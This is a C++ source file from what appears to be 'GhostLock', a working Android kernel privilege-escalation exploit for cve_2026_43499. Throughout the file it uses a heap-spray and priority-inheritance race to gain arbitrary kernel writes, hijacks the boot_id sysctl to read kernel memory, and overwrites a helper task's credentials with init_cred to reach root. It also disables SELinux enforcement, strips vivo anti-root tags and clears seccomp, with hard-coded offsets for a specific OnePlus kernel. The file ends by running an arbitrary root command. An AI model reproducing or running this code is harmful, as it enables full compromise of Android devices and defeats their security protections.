/*
 * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B).
 *
 * The setup stage, the W1-W3 step sequence and the shared write/retry
 * primitives moved out of the retired ExploitProcedure. The middleware policy
 * is a template parameter: route hooks are direct static calls on `Middleware`
 * (Batch 4 review P1-B), so the catalogued middleware each instantiate their
 * own backend code. The body is otherwise unchanged: same statements, same
 * order, same log text.
 */

#include "session/backend/cve_2026_43499_backend.hpp"

#include "attack/ops.hpp"
#include "common.h"
#include "kernel/target.h"
#include "kernelsnitch/utils.h"
#include "profile/macros.h"
#include "race/threads.hpp"
#include "route/route_api.hpp"
#include "route/route_middleware.hpp"
#include "route/route_policy.hpp"
#include "session/handoff_probe.hpp"
#include "session/victim_process.hpp"
#include "support/decls.hpp"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"

#include <unistd.h>

#include <cstdlib>
#include <cstring>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#include <array>
#include <cstdint>
#include <optional>
#include <string_view>
#include <utility>

namespace ghostlock::session::backend {
    namespace {
        /* Shared write/retry sequence. */
        template <class M>
        Status retry_write_stage(
            ExploitSession &session,
            const char *stage,
            uintptr_t target,
            int32_t mode,
            uint32_t attempts,
            useconds_t settle_usec,
            write_stage_verify_fn verify,
            void *context,
            int32_t leaf) {

            /* no attempt can move a target that is wrong by construction, and the
             * stage belongs in the log with the address rather than the route */
            if (!attack::in_direct_map(target)) {
                pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n", stage, target);
                return false;
            }

            const auto request = memory::WriteRequest::make(target, static_cast<memory::WriteMode>(mode), leaf != 0);

            for (uint32_t attempt = 1; attempt <= attempts; attempt++) {
                pr_info("%s attempt %u/%u\n", stage, attempt, attempts);

                /* the previous attempt's write can land after its verify read; check
                 * before paying for another heap spray */
                if (attempt > 1 && verify(context)) {
                    return true;
                }
                if (attempt == 1) {
                    attack::slab_drain();
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_prebuild(session)) return false;
                }
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                if (!routed) {
                    support::discard_prebuilt_page();
                    pr_warning("%s attempt %u route failed; backing off\n", stage, attempt);
                    usleep(100000);
                    continue;
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_activate(session)) return false;
                }
                if (settle_usec) usleep(settle_usec);
                if (verify(context)) return true;
                usleep(50000);
            }
            /* the last write can land after its verify read */
            return verify(context) != 0;
        }

        /* =================================================================
         * 2V sysctl-boot_id root path (MTK 5.10, no perf needed).
         *
         * OnePlus Ace 2V offsets (kernel 5.10.246-android12-9-o-g288c2c3287ed,
         * KASLR slide 0, kernel_phys_load 0x40000000):
         *   sysctl ctl_table boot_id entry data field @ 0x29cb930
         *   nfulnl_logger (hijack data value)        @ 0x28b14f8
         *   selinux_state base                        @ 0x2b6c000
         *   init_task                                 @ 0x28bc040
         *   task_struct: cred @ +0x780, comm @ +0x790
         * The tasks ring offset is auto-probed on-device.
         * ================================================================= */
        constexpr uintptr_t kCtlDataField = 0xffffff80029cb930ULL;
        constexpr uintptr_t kNfulnlLogger = 0xffffff80028b14f8ULL;
        constexpr uintptr_t kSelinuxState = 0xffffff8002b6c000ULL;
        constexpr uintptr_t kInitTask2v = 0xffffff80028bc040ULL;
        constexpr uintptr_t kTaskCredOff = 0x780ULL;
        constexpr uintptr_t kTaskCommOff = 0x790ULL;
        constexpr uintptr_t kHelperCommTag = 0x76326c74736f6867ULL; /* "ghostl2v" LE */
        constexpr int32_t kSysctlWalkSteps = 40;

        bool read_boot_id16(unsigned char out[16]) {
            int p[2];
            if (pipe2(p, O_CLOEXEC) != 0) return false;
            pid_t c = fork();
            if (c < 0) {
                close(p[0]);
                close(p[1]);
                return false;
            }
            if (c == 0) {
                close(p[0]);
                unsigned char tmp[16];
                int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
                if (fd >= 0) {
                    ssize_t n = read(fd, tmp, sizeof(tmp));
                    if (n > 0) (void)write(p[1], tmp, static_cast<size_t>(n));
                    close(fd);
                }
                _exit(0);
            }
            close(p[1]);
            ssize_t got = read(p[0], out, 16);
            int st = 0;
            (void)waitpid(c, &st, 0);
            close(p[0]);
            return got >= 8;
        }

        uint64_t sysctl_load64(const unsigned char *p) {
            uint64_t v = 0;
            memcpy(&v, p, sizeof(v));
            return v;
        }

        /* Write ctl.data := addr, then read 16 bytes at addr through boot_id. */
        template <class M>
        uint64_t sysctl_read64(ExploitSession &session, uintptr_t addr,
                               const char *tag) {
            const memory::WriteRequest req = memory::WriteRequest::make_value(
                kCtlDataField, addr);
            if (!Cve2026_43499Policy::template attack_write<M>(
                    session, req, tag)) {
                pr_warning("sysctl_read64(%s): hijack write failed\n", tag);
                return 0;
            }
            unsigned char buf[16]{};
            if (!read_boot_id16(buf)) {
                pr_warning("sysctl_read64(%s): boot_id read failed\n", tag);
                return 0;
            }
            return sysctl_load64(buf);
        }

        /* Fork a helper parked until uid 0. It notifies the parent through
         * `notify` and runs $GL_ROOT_CMD once rooted. */
        pid_t sysctl_fork_helper(int notify[2]) {
            if (pipe2(notify, O_CLOEXEC | O_NONBLOCK) != 0) return -1;
            pid_t helper = fork();
            if (helper < 0) {
                close(notify[0]);
                close(notify[1]);
                return -1;
            }
            if (helper == 0) {
                close(notify[0]);
                (void)prctl(PR_SET_NAME, "ghostl2v_h1", 0, 0, 0);
                for (int i = 0; i < 600; i++) {
                    if (getuid() == 0) {
                        const char c = 'R';
                        (void)write(notify[1], &c, 1);
                        const char *cmd = getenv("GL_ROOT_CMD");
                        if (cmd && *cmd) {
                            (void)system(cmd);
                        } else {
                            (void)system("echo ROOT_READY > /data/local/tmp/"
                                         "ghostlock_root_flag; id");
                        }
                        _exit(0);
                    }
                    usleep(100000);
                }
                _exit(3);
            }
            close(notify[1]);
            return helper;
        }

        template <class M>
        bool sysctl_2v_path(ExploitSession &session) {
            /* ---- S0: hijack boot_id ctl_table.data := &nfulnl_logger ----
             * From then on, /proc/sys/kernel/random/boot_id reads 16 bytes at
             * whatever address we last wrote into the data field. */
            {
                const memory::WriteRequest hijack = memory::WriteRequest::make_value(
                    kCtlDataField, kNfulnlLogger);
                if (!Cve2026_43499Policy::template attack_write<M>(
                        session, hijack, "SYS0: hijack ctl.data")) {
                    pr_warning("SYS0: hijack write failed\n");
                    return false;
                }
                unsigned char probe[16]{};
                if (!read_boot_id16(probe)) {
                    pr_warning("SYS0: probe read failed\n");
                    return false;
                }
                const uint64_t slot = sysctl_load64(probe);
                pr_success("SYS0: boot_id now reads 0x%016llx\n", slot);
                if ((slot & 0xff00000000000000ULL) != 0xff00000000000000ULL) {
                    pr_warning("SYS0: read-back is not a kernel pointer; "
                               "hijack failed\n");
                    return false;
                }
            }

            /* ---- S1: auto-probe TASK_TASKS_OFF on init_task's ring ----
             * 5.10 task_struct.tasks sits in 0x100..0x300; the entry's next
             * points at (some task)+off and that task's prev points back. */
            uintptr_t tasks_off = 0;
            for (uintptr_t off = 0x100; off < 0x300 && !tasks_off; off += 8) {
                const uint64_t next = sysctl_read64<M>(
                    session, kInitTask2v + off, "SYS1: ring next");
                if (!next || next < 0xffffff8000000000ULL ||
                    next > 0xffffffc000000000ULL) {
                    continue;
                }
                const uintptr_t base = static_cast<uintptr_t>(next) - off;
                if (base < 0xffffff8000000000ULL ||
                    base > 0xffffffc000000000ULL) {
                    continue;
                }
                const uint64_t prev = sysctl_read64<M>(
                    session, base + off + 8, "SYS1: ring prev");
                if (static_cast<uintptr_t>(prev) == kInitTask2v + off) {
                    tasks_off = off;
                    pr_success("SYS1: TASK_TASKS_OFF = 0x%zx\n", off);
                    break;
                }
            }
            if (!tasks_off) {
                pr_warning("SYS1: could not locate the tasks ring\n");
                return false;
            }

            /* ---- S2: fork a helper parked until uid 0 ----
             * Created right before the walk, so it sits near the head of the
             * task ring and is found within a few steps. */
            int notify[2]{};
            const pid_t helper = sysctl_fork_helper(notify);
            if (helper <= 0) {
                pr_warning("SYS2: helper fork failed\n");
                return false;
            }

            /* ---- S3: walk the ring (next direction, newest first) ----
             * Find the helper by its unique comm. */
            uintptr_t helper_task = 0;
            uintptr_t cur = kInitTask2v + tasks_off;
            for (int32_t step = 0; step < kSysctlWalkSteps; step++) {
                const uint64_t next = sysctl_read64<M>(
                    session, cur, "SYS3: walk next");
                if (!next) {
                    pr_warning("SYS3: walk read failed at step %d\n", step);
                    break;
                }
                const uintptr_t entry = static_cast<uintptr_t>(next);
                const uintptr_t task = entry - tasks_off;
                if (task == kInitTask2v) break; /* wrapped */
                const uint64_t comm8 = sysctl_read64<M>(
                    session, task + kTaskCommOff, "SYS3: comm");
                if (comm8 == kHelperCommTag) {
                    helper_task = task;
                    pr_success("SYS3: helper task = 0x%016zx at step %d\n",
                               task, step);
                    break;
                }
                cur = entry;
            }
            if (!helper_task) {
                pr_warning("SYS3: helper not found in %d ring steps\n",
                           kSysctlWalkSteps);
                kill(helper, SIGKILL);
                (void)waitpid(helper, nullptr, 0);
                close(notify[0]);
                return false;
            }

            /* ---- S4: read the current cred pointer (read sanity) ---- */
            const uint64_t old_cred = sysctl_read64<M>(
                session, helper_task + kTaskCredOff, "SYS4: cred");
            if (!old_cred) {
                pr_warning("SYS4: cred read failed\n");
                kill(helper, SIGKILL);
                (void)waitpid(helper, nullptr, 0);
                close(notify[0]);
                return false;
            }
            pr_success("SYS4: helper cred was 0x%016llx\n", old_cred);

            /* ---- S5: overwrite cred with init_cred (retry until rooted) ---- */
            bool rooted = false;
            for (int32_t attempt = 1; attempt <= 3 && !rooted; attempt++) {
                const memory::WriteRequest cred = memory::WriteRequest::make(
                    helper_task + kTaskCredOff,
                    memory::WriteMode::Credential, 1);
                if (!Cve2026_43499Policy::template attack_write<M>(
                        session, cred, "SYS5: cred")) {
                    pr_warning("SYS5 attempt %d route failed\n", attempt);
                    usleep(100000);
                    continue;
                }
                usleep(200000);
                char c = 0;
                if (read(notify[0], &c, 1) == 1 && c == 'R') rooted = true;
            }
            if (!rooted) {
                pr_warning("SYS5: helper never rooted\n");
                kill(helper, SIGKILL);
                (void)waitpid(helper, nullptr, 0);
                close(notify[0]);
                return false;
            }
            pr_success("SYS5: helper is uid 0\n");

            /* ---- S6: make SELinux permissive ----
             * Read the first 16 bytes of selinux_state to find which byte is
             * `enforcing` (H1: enforcing@0, checkreqprot@1, initialized@2;
             * H2: disabled@0, enforcing@1, checkreqprot@2, initialized@3). */
            const uint64_t s0 = sysctl_read64<M>(
                session, kSelinuxState, "SYS6: state+0");
            const uint64_t s1 = sysctl_read64<M>(
                session, kSelinuxState + 8, "SYS6: state+8");
            unsigned char st[16];
            memcpy(st, &s0, 8);
            memcpy(st + 8, &s1, 8);
            pr_info("SYS6: selinux_state bytes "
                    "%02x %02x %02x %02x %02x %02x %02x %02x\n",
                    st[0], st[1], st[2], st[3],
                    st[4], st[5], st[6], st[7]);
            int32_t enforce_off = 0; /* H1 default */
            if (st[0] == 0 && st[1] == 1) enforce_off = 1; /* H2 */
            uint64_t value = 0;
            for (int32_t i = 7; i >= 0; i--) {
                uint8_t b = st[i];
                if (i == enforce_off) b = 0;
                if (enforce_off == 1 && i == 0) b = 0; /* keep disabled 0 */
                value = (value << 8) | b;
            }
            pr_success("SYS6: clearing enforcing byte %d, value 0x%016llx\n",
                       enforce_off, value);
            const memory::WriteRequest perm = memory::WriteRequest::make_value(
                kSelinuxState, value);
            bool permissive = false;
            for (int32_t attempt = 1; attempt <= 3 && !permissive; attempt++) {
                if (!Cve2026_43499Policy::template attack_write<M>(
                        session, perm, "SYS6: permissive")) {
                    pr_warning("SYS6 attempt %d route failed\n", attempt);
                    usleep(100000);
                    continue;
                }
                usleep(200000);
                const uint64_t v = sysctl_read64<M>(
                    session, kSelinuxState, "SYS6: verify");
                const unsigned char *vb =
                    reinterpret_cast<const unsigned char *>(&v);
                if (vb[enforce_off] == 0) permissive = true;
            }
            if (!permissive) {
                pr_warning("SYS6: enforcing byte not cleared; root may still "
                           "work with DAC-only privileges\n");
            } else {
                pr_success("SYS6: SELinux permissive\n");
            }
            close(notify[0]);
            return true;
        }

        /* W3 chain retry: park the previous rooted child on its command pipe so the
         * late-load stage can still start a root shell from it. */
        void park_retry_child(ExploitSession &session, VictimChain &chain,
                              const uint32_t round, const uint32_t chain_rounds) {
            victim::VictimContext &pipes = session.victim;
            pr_warning("W3 chain retry %u/%u: parking rooted child\n",
                       round, chain_rounds);
            if (chain.child_alive && pipes.child() > 0) {
                write(pipes.cmd_write.get(), "P", 1);
                usleep(50000);
                session.parked_victim = pipes.release_child();
                session.parked_victim_cmd = std::move(pipes.cmd_write);
            } else {
                pipes.cmd_write.reset();
            }
            pipes.uid_read.reset();
            chain.child_alive = 1;
            chain.seccomp_ok = 0;
        }

        /* Spawn one victim, clear the vivo tag (when built) and write the credential.
         * Retry means the perf leak missed and the chain should respawn. */
        template <class M>
        VictimRound w2(ExploitSession &session, VictimChain &chain,
                       victim::w2_stage_context &w2_context,
                       uintptr_t &child_task) {
            victim::VictimContext &pipes = session.victim;
            int32_t &child_alive = chain.child_alive;

            const auto spawned = victim::spawn_victim(pipes);
            if (!spawned) {
                pr_warning("fork failed\n");
                return VictimRound::Failed;
            }
            child_task = spawned->task;
            attack::timer_mark("perf_find_task done");

            if (!child_task) {
                /* nothing rooted yet; safe to kill and burn a round */
                pr_warning("perf leak did not reproduce; retrying next round\n");
                const pid_t unrooted = pipes.release_child();
                if (unrooted > 0) {
                    kill(-unrooted, SIGKILL);
                    waitpid(unrooted, nullptr, 0);
                }

                child_alive = 0;
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                return VictimRound::Retry;
            }

            pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
            /* ------------------------------------------------------------------
         * vivo vr.ko anti-root per-task bypass (ported from root.c)
         * ------------------------------------------------------------------
         * Always compiled: the /proc/modules probe below decides at runtime
         * whether the writes run. The tag-B offset is overridable at build time
         * (profile/macros.h), not gated by a define.
         *
         * vr.ko tags every app-origin task at fork/clone time. When the task
         * later holds euid 0, the sys_exit tracepoint probe kills it. We must
         * strip the tag BEFORE W2 verify runs the child's getuid().
         *
         * This exploit primitive is 64-bit granular, so:
         *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
         *     clears the syscall-tracepoint bit (0x400). This takes the task
         *     off the sys_exit slow-path immediately.
         *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
         *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
         *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
         * ------------------------------------------------------------------ */
            support::run_state::enter("w2b");
            {
                static int32_t vr_needed = -1;
                if (vr_needed < 0) {
                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
                    if (FILE *m = fopen("/proc/modules", "r")) {
                        auto close_modules = ghostlock::support::make_scope_exit(
                            [m]() noexcept { fclose(m); });
                        std::array<char, 256> mod{};
                        vr_needed = 0;
                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
                            const std::string_view line(mod.data());
                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
                             * then the module-name separator. */
                            const bool vr_prefix =
                                    line.size() >= 2 &&
                                    (line[0] == 'v' || line[0] == 'V') &&
                                    (line[1] == 'r' || line[1] == 'R');
                            if (vr_prefix && line.size() > 2 &&
                                (line[2] == ' ' || line[2] == '_')) {
                                vr_needed = 1;
                                break;
                            }
                        }
                    }
                    pr_info("vr.ko %s\n", vr_needed
                            ? "loaded; clearing tags"
                            : "not loaded; skipping tag clear");
                }

                int32_t vr_ok = 1;
                if (vr_needed) {
                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
                    const memory::WriteRequest flags_request = memory::WriteRequest::make(
                        child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");

                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
                    if (vr_ok) {
                        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                        const memory::WriteRequest tagb_request =
                                memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
                    }

                    if (vr_ok) {
                        pr_success("VR.ko per-task tags cleared\n");
                    } else {
                        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
                    }
                }
            }
            support::run_state::complete("w2b");

            support::run_state::enter("w2a");
            Status got_root = retry_write_stage<M>(
                session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                g_exploit_session.profile.w2_attempts(),
                g_exploit_session.profile.w2_settle_us(),
                victim::verify_w2_stage, &w2_context, 0);
            if (!got_root) {
                write(pipes.cmd_write.get(), "X", 1);
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                pr_warning("W2 failed after %u rounds\n",
                           g_exploit_session.profile.w2_attempts());
                waitpid(pipes.child(), nullptr, WNOHANG);
                return VictimRound::Failed;
            }
            support::run_state::complete("w2a");
            chain.ever_rooted = 1;
            /* rooted children never exit; chain failures park (P) */
            return VictimRound::Rooted;
        }

        /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
         * child probe reports a filter-free fork. */
        template <class M>
        bool w3(ExploitSession &session, VictimChain &chain,
                victim::w2_stage_context &w2_context,
                uintptr_t child_task) {
            victim::VictimContext &pipes = session.victim;
            int32_t &child_alive = chain.child_alive;
            int32_t &seccomp_ok = chain.seccomp_ok;

            /* W3: clear the child's seccomp filter for the independent root shell
         * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
         * must be zeroed too; do both writes back-to-back with one probe
         * (real finit_module calls trip vendor root guards).
         * tcp stamps *(target) exactly, so aim straight at thread_info.flags
         * (task+0) / seccomp.mode; only the pselect fallback needs the comm
         * probe to tell [target] from [target+8]. */
            if (!attack::process_has_seccomp()) {
                pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
                seccomp_ok = 1;
                return true;
            }

            constexpr bool exact_target = M::w3_exact_target;
            victim::w3_stage_context w3_context = {
                .pipes = pipes,
                .leaf_to_target8 = !exact_target,
            };
            if (!exact_target) {
                support::run_state::enter("w3a");
                Status dir_ok = retry_write_stage<M>(
                    session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
                    victim::verify_leaf_dir_stage, &w3_context, 1);
                if (!dir_ok) {
                    /* U01/S14: upstream retires the child instead of guessing the leaf
                 * direction and blind-writing the task neighbour. Returning false
                 * hands control back to the W2/W3 chain, which parks this child and
                 * spawns a fresh one for the next round. */
                    pr_warning("W3 leaf direction probe failed; retiring child\n");
                    return false;
                }
                support::run_state::complete("w3a");
            } else {
                support::run_state::complete("w3a");
            }

            uintptr_t flags_target = w3_context.leaf_to_target8
                                         ? child_task - 8
                                         : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
            uintptr_t mode_target = w3_context.leaf_to_target8
                                        ? child_task + ghostlock::profile::task_seccomp_off() - 8
                                        : child_task + ghostlock::profile::task_seccomp_off();

            uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
            for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
                pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
                if (attempt == 1) attack::slab_drain();
                support::run_state::enter("w3b");
                const memory::WriteRequest flags_request =
                        memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
                if (!routed) {
                    pr_warning("W3 attempt %u route failed; backing off\n", attempt);
                    usleep(100000);
                    continue;
                }
                support::run_state::complete("w3b");
                usleep(g_exploit_session.profile.w3_settle_us());
                support::run_state::enter("w3c");
                const memory::WriteRequest mode_request =
                        memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
                routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
                if (!routed) {
                    pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
                    usleep(100000);
                    continue;
                }
                support::run_state::complete("w3c");
                usleep(g_exploit_session.profile.w3_settle_us());
                int32_t st = 0;
                if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
                    pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
                    pipes.mark_child_exited();
                    child_alive = 0;
                    break;
                }
                if (victim::verify_seccomp_probe_stage(&w2_context)) {
                    seccomp_ok = 1;
                    break;
                }
                usleep(g_exploit_session.profile.w3_settle_us());
            }

            if (!seccomp_ok) {
                pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
                return false;
            }
            pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
            return true;
        }

        /* W1b: the non-resident multicast middleware repairs its private scratch
         * page before W2. The body stays here because it calls the shared write
         * primitive; whether it is needed is a capability of the middleware. */
        template <class M>
        bool w1_scratch_repair(ExploitSession &session) {
            if constexpr (!M::multicast) {
                return true;
            } else {
                const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
                const uintptr_t w1_scratch_poison =
                        (session.heap.current.base) + mcast.buffer_size.value_or(0);
                if (!support::quarantine_reclaim_sockets()) {
                    pr_warning("W1 scratch page quarantine failed\n");
                    return false;
                }
                int32_t repaired = 0;
                const uint32_t repair_attempts =
                        g_exploit_session.profile.w1_scratch_repair_attempts();
                for (uint32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
                    pr_info("W1b: private scratch repair attempt %u/%u\n",
                            repair_try, repair_attempts);
                    const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
                        w1_scratch_poison, memory::WriteMode::Zero, 1);
                    if (Cve2026_43499Policy::template attack_write<M>(
                            session, scratch_repair, "W1b: private scratch repair")) {
                        repaired = 1;
                        break;
                    }
                    usleep(50000);
                }
                if (repaired) {
                    pr_success("private scratch repaired; releasing quarantine\n");
                    support::release_quarantined_reclaim_sockets();
                    return true;
                }
                pr_warning("private scratch repair failed; keeping page quarantined\n");
                return false;
            }
        }

        /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
        template <class M>
        StageResult w1(ExploitSession &session) {
            /* W1: disable SELinux before task discovery. untrusted_app may not be able
         * to read enforce while it is still enforcing, so attempt W1 regardless. */
            Status selinux_ok = attack::check_selinux_off();
            if (!selinux_ok) {
                /* MTK 5.10 (OnePlus Ace 2V) layout: the 8-byte W1 zero write
                 * lands across selinux_state fields (initialized/enforcing) and
                 * the policy pointer at +8, which panics the kernel. SELinux is
                 * bypassed anyway by W2's DirtyCred swap: redirecting task->cred
                 * to init_cred carries the init LSM blob, so the child runs in
                 * the init domain without disabling enforcement. Skip W1 here. */
                pr_warning("W1 skipped for MTK 5.10 layout (8-byte write corrupts "
                           "selinux_state); relying on init_cred domain swap\n");
                attack::timer_mark("Write 1 skipped");
                support::run_state::complete("w1a");
                /* W1b repairs the multicast private scratch page poisoned by a W1
                 * write; with W1 skipped there is nothing to repair and the
                 * quarantine call itself fails (no sockets to reclaim), so skip
                 * W1b as well. */
                support::run_state::complete("w1b");
                return StageResult::Continue;
            }
            pr_success("SELinux already permissive\n");
            support::run_state::complete("w1a");
            support::run_state::complete("w1b");
            return StageResult::Continue;
        }
    } // namespace

    /* Stage: process setup and profile installation. */
    StageResult Cve2026_43499Policy::run_setup(ExploitSession &session,
                                               const profile::kernel_offsets &decoded,
                                               const char *debug_dir, bool force_attack) {
        session.heap.init();
        support::disable_rseq_for_thread();
        kernel::set_unbuffer();
        signal(SIGPIPE, SIG_IGN);
        kernel::set_limit();
        route::reserve_standard_io();
        if (config::runtime_config_snapshot().init() != 0) {
            pr_error("runtime configuration failed errno=%d\n", errno);
            throw FatalError{};
        }
        if (debug_dir && debug_dir[0])
            config::runtime_config_snapshot().debug_dir = debug_dir;
        if (!session.profile.loaded())
            attack::install_profile(decoded);
        /* Robustness guard: running the attack where KernelSU already owns root
         * drives the re-enforce path that panics the kernel at the first PI
         * route, and the objective is already met. Bail out cleanly instead; a
         * cold boot clears the module for a real run. The forced test skips
         * this check on purpose and relies on the root script discarding the
         * child. */
        if (!force_attack && ksu_root_owned()) {
            pr_warning("KernelSU already has root; skipping exploit "
                "(cold boot for a clean run, or enable the forced test)\n");
            return StageResult::Done;
        }
        attack::write_root_script();

        attack::apply_iomem_cache();
        support::log_startup_context();
        support::init_p0_profile();
        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        pr_info("main thread running on cpu=%d\n", sched_getcpu());

        attack::timer_reset();
        attack::timer_mark("exploit start");
        return StageResult::Continue;
    }

    /* One route write: middleware resident fast path, else heap spray + PI race.
     * Shared statement order; the middleware policy decides the resident step. */
    template <class M>
    Status Cve2026_43499Policy::attack_write(ExploitSession &session,
                                             const memory::WriteRequest &request,
                                             const char *desc) {
        pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
                request.target, static_cast<int32_t>(request.mode),
                !request.preserve_child);
        if (!attack::in_direct_map(request.target)) {
            pr_warning("  target is outside the direct map, not writing\n");
            return 0;
        }

        /* Both transports write *(target) := value through the erase left-only
         * relink: waiter words are {pc = value, right = 0, left = target} and
         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
        attack::timer_mark("  heap spray start");
        (session.heap.current.base) = support::prepare_good_kernel_page(request);
        if (!(session.heap.current.base)) {
            pr_warning("  heap spray failed\n");
            return 0;
        }

        attack::timer_mark("  heap spray done");
        Status routed = route::middleware::run_middleware_route(session, request);

        attack::timer_mark("  PI route done");
        if (!routed) {
            pr_warning("  PI route did not produce a verified write\n");
        }

        return routed;
    }

    template <class M>
    StageResult Cve2026_43499Policy::run(ExploitSession &session,
                                         const profile::kernel_offsets &decoded,
                                         const char *debug_dir, bool force_attack,
                                         VictimChain &chain) {
        switch (run_setup(session, decoded, debug_dir, force_attack)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }
        switch (w1<M>(session)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }

        /* 2V first: the sysctl-boot_id path roots without perf (W2's perf
         * find-task is errno=13 on MTK 5.10). It only succeeds on the 2V
         * layout; elsewhere S0 fails cleanly and the legacy W2+W3 chain runs. */
        if (sysctl_2v_path<M>(session)) {
            pr_success("sysctl-2v path rooted; handing off\n");
            return StageResult::Done;
        }
        pr_warning("sysctl-2v path failed; falling back to W2+W3\n");

        /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
         * child, so respawn and redo. */
        attack::slab_drain();
        attack::timer_mark("pre-W2 drain");
        victim::w2_stage_context w2_context = {.pipes = session.victim};
        const uint32_t chain_rounds = g_exploit_session.profile.w3_chain_rounds();
        for (uint32_t round = 1; round <= chain_rounds; round++) {
            if (round > 1) park_retry_child(session, chain, round, chain_rounds);

            uintptr_t child_task = 0;
            const VictimRound rooted = w2<M>(session, chain, w2_context, child_task);
            if (rooted == VictimRound::Failed) return StageResult::Failed;
            if (rooted == VictimRound::Retry) continue;
            if (w3<M>(session, chain, w2_context, child_task)) break;
        }
        if (!chain.seccomp_ok) {
            pr_warning("W3 seccomp bypass failed after %u chain rounds; ksud late-load will likely stay blocked\n",
                       chain_rounds);
        }
        /* The frontend handoff step finishes the run. */
        return StageResult::Continue;
    }

    /* Explicit instantiations: the catalogued middleware policies. Callers only
     * include the header; the definitions stay in this unit. */
    template StageResult Cve2026_43499Policy::run<route::SelectPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::TcpPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::MulticastPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);

    template Status Cve2026_43499Policy::attack_write<route::SelectPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::TcpPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
} // namespace ghostlock::session::backend
